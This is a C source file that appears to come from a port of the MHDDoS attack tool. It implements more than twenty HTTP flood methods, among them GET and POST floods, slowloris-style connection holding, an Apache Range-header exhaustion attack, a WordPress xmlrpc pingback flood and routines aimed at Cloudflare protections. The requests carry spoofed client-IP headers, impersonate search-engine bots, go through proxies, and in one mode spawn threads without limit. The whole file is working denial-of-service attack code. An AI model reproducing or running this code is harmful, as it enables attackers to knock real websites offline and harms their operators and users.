#include "mhddos.h"

extern const char *rand_search_agent(void);

int open_connection_l7(layer7_args_t *args) {
    return open_connection_l4(args->host_ip, args->target.port, args->proxies, args->proxy_count);
}

void generate_spoof_headers(char *buf, int buflen) {
    char ip[32];
    rand_ipv4(ip, sizeof(ip));
    snprintf(buf, buflen,
        "X-Forwarded-Proto: Http\r\n"
        "X-Forwarded-Host: 1.1.1.1\r\n"
        "Via: %s\r\n"
        "Client-IP: %s\r\n"
        "X-Forwarded-For: %s\r\n"
        "Real-IP: %s\r\n", ip, ip, ip, ip);
}

void generate_l7_payload(layer7_args_t *args, const char *extra, char *buf, int buflen) {
    const char *method_str = get_method_type_str(args->method);
    const char *http_ver = (rand() % 3 == 0) ? "1.0" : (rand() % 2 == 0) ? "1.1" : "1.2";
    char spoof[512]; generate_spoof_headers(spoof, sizeof(spoof));
    char *ua = rand_choice_str(args->useragents, args->useragent_count);
    char *ref = rand_choice_str(args->referers, args->referer_count);
    snprintf(buf, buflen,
        "%s %s HTTP/%s\r\n"
        "Host: %s\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Cache-Control: max-age=0\r\n"
        "Connection: keep-alive\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "Sec-Gpc: 1\r\n"
        "Pragma: no-cache\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "User-Agent: %s\r\n"
        "Referrer: %s%s\r\n"
        "%s"
        "%s"
        "\r\n",
        method_str, args->target.raw_path_qs, http_ver,
        args->target.authority, ua, ref, args->target.human_repr,
        spoof, extra ? extra : "");
}

void flood_get(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char payload[8192];
        generate_l7_payload(args, NULL, payload, sizeof(payload));
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_post(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char rdata[33]; rand_str(rdata, 32);
        char extra[256];
        snprintf(extra, sizeof(extra),
            "Content-Length: 44\r\n"
            "X-Requested-With: XMLHttpRequest\r\n"
            "Content-Type: application/json\r\n\r\n"
            "{\"data\": \"%s\"}", rdata);
        char payload[8192];
        generate_l7_payload(args, extra, payload, sizeof(payload));
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_stress(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char rdata[513]; rand_str(rdata, 512);
        char extra[768];
        snprintf(extra, sizeof(extra),
            "Content-Length: 524\r\n"
            "X-Requested-With: XMLHttpRequest\r\n"
            "Content-Type: application/json\r\n\r\n"
            "{\"data\": \"%s\"}", rdata);
        char payload[8192];
        generate_l7_payload(args, extra, payload, sizeof(payload));
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_pps(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        const char *method_str = get_method_type_str(args->method);
        const char *http_ver = (rand() % 2) ? "1.0" : "1.1";
        char payload[2048];
        snprintf(payload, sizeof(payload), "%s %s HTTP/%s\r\nHost: %s\r\n\r\n",
                method_str, args->target.raw_path_qs, http_ver, args->target.authority);
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_even(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char payload[8192];
        generate_l7_payload(args, NULL, payload, sizeof(payload));
        uint8_t recv_buf[1];
        while (*args->running && tools_send(s, (uint8_t*)payload, strlen(payload))) {
            int r = recv(s, recv_buf, 1, 0);
            if (r <= 0) break;
        }
        safe_close(s);
    }
}

void flood_ovh(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char payload[8192];
        generate_l7_payload(args, NULL, payload, sizeof(payload));
        int rpc = args->rpc < 5 ? args->rpc : 5;
        for (int i = 0; i < rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_null(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        const char *method_str = get_method_type_str(args->method);
        const char *http_ver = (rand() % 2) ? "1.0" : "1.1";
        char spoof[512]; generate_spoof_headers(spoof, sizeof(spoof));
        char payload[4096];
        snprintf(payload, sizeof(payload),
            "%s %s HTTP/%s\r\n"
            "Host: %s\r\n"
            "User-Agent: null\r\n"
            "Referrer: null\r\n"
            "%s\r\n",
            method_str, args->target.raw_path_qs, http_ver,
            args->target.authority, spoof);
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_cookie(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char rk[7]; rand_str(rk, 6);
        char rv[33]; rand_str(rv, 32);
        int ga = rand_int(1000, 99999);
        char extra[512];
        snprintf(extra, sizeof(extra),
            "Cookie: _ga=GA%d; _gat=1; __cfduid=dc232334gwdsd23434542342342342475611928; %s=%s\r\n",
            ga, rk, rv);
        char payload[8192];
        generate_l7_payload(args, extra, payload, sizeof(payload));
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_apache(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char range[16384];
        int rpos = snprintf(range, sizeof(range), "Range: bytes=0-");
        for (int i = 1; i < 1024 && rpos < (int)sizeof(range) - 16; i++)
            rpos += snprintf(range + rpos, sizeof(range) - rpos, ",5-%d", i);
        strcat(range, "\r\n");
        char payload[32768];
        generate_l7_payload(args, range, payload, sizeof(payload));
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_xmlrpc(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char r1[65]; rand_str(r1, 64);
        char r2[65]; rand_str(r2, 64);
        char extra[1024];
        snprintf(extra, sizeof(extra),
            "Content-Length: 345\r\n"
            "X-Requested-With: XMLHttpRequest\r\n"
            "Content-Type: application/xml\r\n\r\n"
            "<?xml version='1.0' encoding='iso-8859-1'?>"
            "<methodCall><methodName>pingback.ping</methodName>"
            "<params><param><value><string>%s</string></value>"
            "</param><param><value><string>%s</string>"
            "</value></param></params></methodCall>", r1, r2);
        char payload[8192];
        generate_l7_payload(args, extra, payload, sizeof(payload));
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_bot(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char p1[2048];
        snprintf(p1, sizeof(p1),
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n"
            "Accept-Encoding: gzip,deflate,br\r\n\r\n",
            args->target.raw_authority, rand_search_agent());
        char r1[10]; rand_str(r1, 9);
        char r2[5]; rand_str(r2, 4);
        char p2[2048];
        snprintf(p2, sizeof(p2),
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n"
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n"
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n",
            args->target.raw_authority, rand_search_agent(), r1, r2);
        tools_send(s, (uint8_t*)p1, strlen(p1));
        tools_send(s, (uint8_t*)p2, strlen(p2));
        char payload[8192];
        generate_l7_payload(args, NULL, payload, sizeof(payload));
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_dyn(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char rnd[7]; rand_str(rnd, 6);
        const char *method_str = get_method_type_str(args->method);
        const char *http_ver = (rand() % 2) ? "1.0" : "1.1";
        char spoof[512]; generate_spoof_headers(spoof, sizeof(spoof));
        char *ua = rand_choice_str(args->useragents, args->useragent_count);
        char *ref = rand_choice_str(args->referers, args->referer_count);
        char payload[8192];
        snprintf(payload, sizeof(payload),
            "%s %s HTTP/%s\r\n"
            "Host: %s.%s\r\n"
            "User-Agent: %s\r\n"
            "Referrer: %s%s\r\n"
            "%s"
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: keep-alive\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n\r\n",
            method_str, args->target.raw_path_qs, http_ver,
            rnd, args->target.authority, ua, ref,
            args->target.human_repr, spoof);
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_slow(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char payload[8192];
        generate_l7_payload(args, NULL, payload, sizeof(payload));
        for (int i = 0; i < args->rpc && *args->running; i++)
            tools_send(s, (uint8_t*)payload, strlen(payload));
        uint8_t recv_buf[1];
        while (*args->running && tools_send(s, (uint8_t*)payload, strlen(payload))) {
            int r = recv(s, recv_buf, 1, 0);
            if (r <= 0) break;
            for (int i = 0; i < args->rpc; i++) {
                int v = rand_int(1, 5000);
                char keep[64];
                int kl = snprintf(keep, sizeof(keep), "X-a: %d\r\n", v);
                tools_send(s, (uint8_t*)keep, kl);
                usleep((args->rpc * 1000000) / 15);
                break;
            }
        }
        safe_close(s);
    }
}

void flood_cfbuam(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char payload[8192];
        generate_l7_payload(args, NULL, payload, sizeof(payload));
        tools_send(s, (uint8_t*)payload, strlen(payload));
        usleep(5010000);
        time_t ts = time(NULL);
        for (int i = 0; i < args->rpc && *args->running; i++) {
            tools_send(s, (uint8_t*)payload, strlen(payload));
            if (time(NULL) > ts + 120) break;
        }
        safe_close(s);
    }
}

void flood_avb(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char payload[8192];
        generate_l7_payload(args, NULL, payload, sizeof(payload));
        for (int i = 0; i < args->rpc && *args->running; i++) {
            int delay = args->rpc > 1000 ? 1000000 : (args->rpc * 1000);
            usleep(delay);
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        }
        safe_close(s);
    }
}

void flood_downloader(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char payload[8192];
        generate_l7_payload(args, NULL, payload, sizeof(payload));
        for (int i = 0; i < args->rpc && *args->running; i++) {
            tools_send(s, (uint8_t*)payload, strlen(payload));
            while (1) {
                usleep(10000);
                uint8_t buf[1];
                int r = recv(s, buf, 1, 0);
                if (r <= 0) break;
            }
        }
        tools_send(s, (uint8_t*)"0", 1);
        safe_close(s);
    }
}

void flood_rhex(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        int hexlen = (rand() % 3 == 0) ? 32 : (rand() % 2 == 0) ? 64 : 128;
        uint8_t hexbytes[128]; rand_bytes(hexbytes, hexlen);
        char hexstr[257]; for (int i = 0; i < hexlen; i++) sprintf(hexstr + i*2, "%02x", hexbytes[i]);
        hexstr[hexlen*2] = 0;
        const char *method_str = get_method_type_str(args->method);
        char spoof[512]; generate_spoof_headers(spoof, sizeof(spoof));
        char *ua = rand_choice_str(args->useragents, args->useragent_count);
        char *ref = rand_choice_str(args->referers, args->referer_count);
        char payload[8192];
        snprintf(payload, sizeof(payload),
            "%s %s/%s HTTP/1.1\r\n"
            "Host: %s/%s\r\n"
            "User-Agent: %s\r\n"
            "Referrer: %s%s\r\n"
            "%s"
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: keep-alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n\r\n",
            method_str, args->target.authority, hexstr,
            args->target.authority, hexstr,
            ua, ref, args->target.human_repr, spoof);
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        safe_close(s);
    }
}

void flood_stomp(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        char hexh[512];
        memset(hexh, 0, sizeof(hexh));
        uint8_t pattern[] = {0x84,0x8B,0x87,0x8F,0x99,0x8F,0x98,0x9C,0x8F,0x98,0xEA};
        int hpos = 0;
        for (int i = 0; i < 24 && hpos < 500; i++)
            for (int j = 0; j < 11 && hpos < 500; j++)
                hexh[hpos++] = pattern[j];
        const char *method_str = get_method_type_str(args->method);
        char spoof[512]; generate_spoof_headers(spoof, sizeof(spoof));
        char *ua = rand_choice_str(args->useragents, args->useragent_count);
        char *ref = rand_choice_str(args->referers, args->referer_count);
        char dep[] = "Accept-Encoding: gzip, deflate, br\r\n"
                     "Accept-Language: en-US,en;q=0.9\r\n"
                     "Cache-Control: max-age=0\r\n"
                     "Connection: keep-alive\r\n"
                     "Sec-Fetch-Dest: document\r\n"
                     "Sec-Fetch-Mode: navigate\r\n"
                     "Sec-Fetch-Site: none\r\n"
                     "Sec-Fetch-User: ?1\r\n"
                     "Sec-Gpc: 1\r\n"
                     "Pragma: no-cache\r\n"
                     "Upgrade-Insecure-Requests: 1\r\n\r\n";
        char p1[16384];
        snprintf(p1, sizeof(p1), "%s %s/%s HTTP/1.1\r\nHost: %s/%s\r\nUser-Agent: %s\r\nReferrer: %s%s\r\n%s%s",
            method_str, args->target.authority, hexh, args->target.authority, hexh, ua, ref, args->target.human_repr, spoof, dep);
        char p2[16384];
        snprintf(p2, sizeof(p2), "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nReferrer: %s%s\r\n%s%s",
            method_str, args->target.authority, hexh, ua, ref, args->target.human_repr, spoof, dep);
        tools_send(s, (uint8_t*)p1, strlen(p1));
        for (int i = 0; i < args->rpc && *args->running; i++)
            if (!tools_send(s, (uint8_t*)p2, strlen(p2))) break;
        safe_close(s);
    }
}

void flood_gsb(layer7_args_t *args) {
    while (*args->running) {
        int s = open_connection_l7(args);
        if (s < 0) continue;
        for (int i = 0; i < args->rpc && *args->running; i++) {
            char qs[7]; rand_str(qs, 6);
            const char *method_str = get_method_type_str(args->method);
            char spoof[512]; generate_spoof_headers(spoof, sizeof(spoof));
            char *ua = rand_choice_str(args->useragents, args->useragent_count);
            char *ref = rand_choice_str(args->referers, args->referer_count);
            char payload[8192];
            snprintf(payload, sizeof(payload),
                "%s %s?qs=%s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Referrer: %s%s\r\n"
                "%s"
                "Accept-Encoding: gzip, deflate, br\r\n"
                "Accept-Language: en-US,en;q=0.9\r\n"
                "Cache-Control: max-age=0\r\n"
                "Connection: Keep-Alive\r\n"
                "Sec-Fetch-Dest: document\r\n"
                "Sec-Fetch-Mode: navigate\r\n"
                "Sec-Fetch-Site: none\r\n"
                "Sec-Fetch-User: ?1\r\n"
                "Sec-Gpc: 1\r\n"
                "Pragma: no-cache\r\n"
                "Upgrade-Insecure-Requests: 1\r\n\r\n",
                method_str, args->target.raw_path_qs, qs,
                args->target.authority, ua, ref, args->target.human_repr, spoof);
            if (!tools_send(s, (uint8_t*)payload, strlen(payload))) break;
        }
        safe_close(s);
    }
}

void flood_bypass(layer7_args_t *args) { flood_get(args); }
void flood_cfb(layer7_args_t *args) { flood_get(args); }
void flood_dgb(layer7_args_t *args) { flood_get(args); }
void flood_tor(layer7_args_t *args) { flood_get(args); }

void flood_killer(layer7_args_t *args) {
    while (*args->running) {
        pthread_t t;
        layer7_args_t *copy = malloc(sizeof(layer7_args_t));
        memcpy(copy, args, sizeof(layer7_args_t));
        copy->method = METHOD_GET;
        pthread_create(&t, NULL, (void*(*)(void*))flood_get, copy);
        pthread_detach(t);
    }
}

void *layer7_thread(void *arg) {
    layer7_args_t *args = (layer7_args_t *)arg;
    while (!(*args->running)) usleep(10000);
    switch (args->method) {
        case METHOD_GET: flood_get(args); break;
        case METHOD_POST: flood_post(args); break;
        case METHOD_STRESS: flood_stress(args); break;
        case METHOD_PPS: flood_pps(args); break;
        case METHOD_EVEN: flood_even(args); break;
        case METHOD_OVH: flood_ovh(args); break;
        case METHOD_NULL: flood_null(args); break;
        case METHOD_COOKIE: flood_cookie(args); break;
        case METHOD_APACHE: flood_apache(args); break;
        case METHOD_XMLRPC: flood_xmlrpc(args); break;
        case METHOD_BOT: flood_bot(args); break;
        case METHOD_DYN: flood_dyn(args); break;
        case METHOD_SLOW: flood_slow(args); break;
        case METHOD_CFBUAM: flood_cfbuam(args); break;
        case METHOD_AVB: flood_avb(args); break;
        case METHOD_DOWNLOADER: flood_downloader(args); break;
        case METHOD_RHEX: flood_rhex(args); break;
        case METHOD_STOMP: flood_stomp(args); break;
        case METHOD_GSB: flood_gsb(args); break;
        case METHOD_CFB: flood_cfb(args); break;
        case METHOD_BYPASS: flood_bypass(args); break;
        case METHOD_DGB: flood_dgb(args); break;
        case METHOD_TOR: flood_tor(args); break;
        case METHOD_KILLER: flood_killer(args); break;
        case METHOD_HEAD: flood_get(args); break;
        default: flood_get(args); break;
    }
    return NULL;
}
